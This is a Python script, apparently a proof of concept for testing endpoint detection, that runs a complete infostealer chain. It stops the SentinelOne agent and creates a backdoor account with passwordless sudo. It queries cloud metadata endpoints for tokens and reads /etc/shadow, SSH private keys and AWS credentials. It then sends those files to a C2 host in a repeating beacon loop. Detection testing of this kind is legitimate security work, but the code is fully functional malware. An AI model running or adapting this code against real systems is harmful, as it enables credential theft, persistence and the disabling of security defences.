import os
import subprocess
import time
import socket

# 0. 헤더 출력
def print_Scenario():
    print("======================================================")
    print("[*] Starting S1_PoC: Advanced InfoStealer Scenario...")
    print("[*] This scenario simulates a sophisticated attack chain targeting credential theft and C2 communication.")
    print("[*] Editor: Kim Eun Chae (ec.kim@shield-one.com)")
    print("[*] Version: 2.0.1")
    print("[*] Date: 2026-05-05")
    print("[*] Warning: This code is for educational and testing purposes only. Do not use it in production environments.")
    print("======================================================")

# 1. 환경 설정 및 C2 정보 추출
def get_config():
    config = {
        "ip": "1.2.3.4",
        "port": 4444,
        "bd_id": "kimEC",
        "bd_pw": "shieldone123"
    }
    try:
        if os.path.exists('requirements.txt'):
            with open('requirements.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    # C2 정보 파싱
                    if 'c2_receiver:' in line:
                        addr = line.split('c2_receiver:')[1].strip()
                        config["ip"] = addr.split(':')[0]
                        config["port"] = int(addr.split(':')[1])
                    # 백도어 정보 파싱 (backdoor_user: id:pw)
                    if 'backdoor_user:' in line:
                        user_info = line.split('backdoor_user:')[1].strip()
                        # ":" 기준으로 나누어 ID와 PW 할당
                        parts = user_info.split(':')
                        if len(parts) >= 2:
                            config["bd_id"] = parts[0].strip()
                            config["bd_pw"] = parts[1].strip()
    except Exception as e:
        print(f"[!] Config Error: {e}")
    return config

# 백도어 계정 생성
def create_backdoor(bd_id, bd_pw):
    print(f"[*] Establishing Persistence: Creating backdoor user '{bd_id}'...")
    try:
        # 계정 생성 및 암호 설정, sudo 권한 부여 (S1 탐지 포인트: Persistence/Privilege Escalation)
        subprocess.run(f"sudo useradd -m -s /bin/bash {bd_id}", shell=True, check=False)
        subprocess.run(f"echo '{bd_id}:{bd_pw}' | sudo chpasswd", shell=True, check=False)
        subprocess.run(f"echo '{bd_id} ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/{bd_id}", shell=True, check=False)
        print(f"[+] Backdoor account '{bd_id}' created with sudo privileges.")
    except Exception as e:
        print(f"[!] Failed to create backdoor: {e}")

# 2. 인포스틸링 및 클라우드 자격 증명 탈취 (S1 탐지 포인트)
def steal_credentials():
    print("[*] Accessing sensitive system files and Cloud IMDS...")
    
    # A. 클라우드 IMDS 토큰 요청 (GCP/AWS 공통 탐지 포인트)
    # GCP Metadata Flavor 포함
    subprocess.run("curl -s -m 1 http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google' > /dev/null 2>&1", shell=True)
    # AWS IAM Role Metadata 접근 시도
    subprocess.run("curl -s -m 1 http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /dev/null 2>&1", shell=True)
    
    # B. OS 자격 증명 및 민감 파일 접근
    commands = [
        "cat /etc/shadow > /dev/null 2>&1",
        "cat /etc/passwd > /dev/null 2>&1",
        "cat ~/.aws/credentials > /dev/null 2>&1",
        "cat ~/.ssh/id_rsa > /dev/null 2>&1",
        "env > /dev/null 2>&1"
    ]
    for cmd in commands:
        subprocess.run(cmd, shell=True)

# 3. C2 헬스체크 및 지속적 비콘 통신
def start_beacon(ip, port):
    print(f"[*] Starting Real-time Data Exfiltration to {ip}:{port}...")
    
    # 탈취할 타겟 파일 목록
    target_files = [
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.ssh/id_rsa"),
        "/etc/passwd"
    ]

    try:
        while True:
            exfil_data = f"\n--- [!] FULL EXFILTRATION: {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n"
            for file_path in target_files:
                if os.path.exists(file_path):
                    try:
                        with open(file_path, 'r') as f:
                            exfil_data += f"\n[FILE: {file_path}]\n{f.read()}\n"
                    except:
                        exfil_data += f"\n[FILE: {file_path}] - Access Denied\n"
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((ip, port))
                s.sendall(exfil_data.encode())
                print(f"[+] Packet sent to C2 at {time.strftime('%H:%M:%S')}")
            time.sleep(15)
    except Exception as e:
        print(f"[!] Connection error: {e}")
        time.sleep(15)

# 4. S1 에이전트 무력화 시도 (Self-Protection 강조용)
def attempt_self_protection_bypass():
    print("[!] Attempting to disable security agents...")
    subprocess.run("sudo pkill -9 s1_agent > /dev/null 2>&1", shell=True)
    subprocess.run("sudo systemctl stop sentinelone > /dev/null 2>&1", shell=True)

# 추가. 외부 반입 페이로드 실행
def verify_payload_integrity():
    payload_dir = "./assets_dist"
    
    print(f"[*] Checking for external payloads in '{payload_dir}'...")
    
    if os.path.exists(payload_dir):
        files = os.listdir(payload_dir)
        if files:
            print(f"[+] Found {len(files)} payload(s) in repository:")
            for i, f in enumerate(files):
                print(f"    - [{i}] {f}")
            
            print("\n[!] SECURITY WARNING: Unverified binaries detected.")
            choice = input("[?] Deploy and set execution permissions for these payloads? (1:True / 2:False): ")
            
            if choice == "1":
                # 시연을 위해 목록 중 첫 번째 파일에 실행 권한 부여
                target_file = os.path.join(payload_dir, files[0])
                subprocess.run(f"chmod +x {target_file}", shell=True)
                print(f"[+] Integrity verified. Permissions granted: {target_file}")
                return True
            else:
                print("[!] Deployment cancelled by operator.")
                return False
        else:
            print("[!] No payloads found in directory.")
    else:
        print(f"[!] Directory '{payload_dir}' not found. Skipping payload verification.")
    return False

# 5. 메인 시나리오 흐름
if __name__ == "__main__":
    print_Scenario()
    cfg = get_config()

    print(f"[+] Found Config - C2: {cfg['ip']}:{cfg['port']}, Backdoor ID: {cfg['bd_id']}")
    choice = input("\n[?] Do you want to proceed with the environment sync? (1:True / 2:False): ")
    
    if choice.lower() == '1':
        attempt_self_protection_bypass()
        create_backdoor(cfg["bd_id"], cfg["bd_pw"])
        steal_credentials()
        verify_payload_integrity()
        
        print("[+] Setup complete. Background tasks running...")
        start_beacon(cfg["ip"], cfg["port"])
    else:
        print("\n[!] Setup cancelled.")